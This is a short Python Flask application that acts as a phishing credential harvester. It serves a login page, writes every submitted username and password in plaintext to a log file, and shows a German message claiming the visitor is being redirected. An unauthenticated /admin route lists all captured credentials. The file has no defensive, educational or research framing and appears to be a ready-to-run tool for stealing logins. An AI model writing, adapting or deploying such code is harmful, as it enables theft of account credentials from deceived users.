
from flask import Flask, render_template, request
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        with open("log.txt", "a") as f:
            f.write(f"[{datetime.now()}] Username: {username} | Password: {password}\n")
        return "<h2>Danke. Du wirst weitergeleitet...</h2>"
    return render_template("index.html")

@app.route("/admin")
def admin():
    with open("log.txt", "r") as f:
        logs = f.readlines()
    return "<br>".join(logs)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
